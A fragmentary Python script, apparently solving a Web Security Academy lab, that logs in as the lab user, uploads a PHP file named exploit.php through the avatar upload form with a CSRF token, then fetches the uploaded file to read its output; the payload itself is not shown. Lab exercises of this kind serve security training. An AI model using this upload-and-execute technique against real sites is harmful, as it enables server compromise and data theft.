...
app_url = "https://0a2300230393e8438120bcc400f500a7.web-security-academy.net"     #application url
...
# files = {'avatar':('abc.php',open('exploit1.php','rb'),'')}
# upload_res = win_session.post(app_url+"/my-account/avatar",verify=False,files=files,data=upload_data,proxies=proxies)
# print(upload_res.text)

files = {'avatar':('exploit.php',exploit,'application/x-php'),
         'user': (None,'wiener'),
         'csrf': (None,ftoken2)
         }
...
#fetch file content
exp_res = win_session.get(app_url+"/files/avatars/exploit.php",verify=False)
answer = exp_res.text
print(answer)
